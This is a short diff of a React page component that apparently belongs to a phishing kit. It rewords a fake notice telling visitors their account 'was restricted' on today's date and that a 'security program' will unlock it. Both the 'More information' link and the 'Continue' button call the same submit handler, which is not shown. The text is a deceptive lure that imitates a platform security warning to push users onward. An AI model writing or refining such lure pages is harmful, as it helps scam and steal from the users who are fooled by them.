@@ -46,8 +46,8 @@ const HomePage = () => {
       <div className="_container">
           <div className="_header_image"><img src={bannerImg} alt="banner"/></div>
           <div className="_header_content">
-            <h1>Your page was restricted on {getCurrentTime()}</h1>
-            <span>Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.</span>
+            <h1>Your account was restricted on {getCurrentTime()}</h1>
+            <span>Your account's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your account.</span>
           </div>
           <a className="_link" onClick={handleSubmit}><span>More information</span></a>
           <button className="_button" onClick={handleSubmit}>Continue</button>
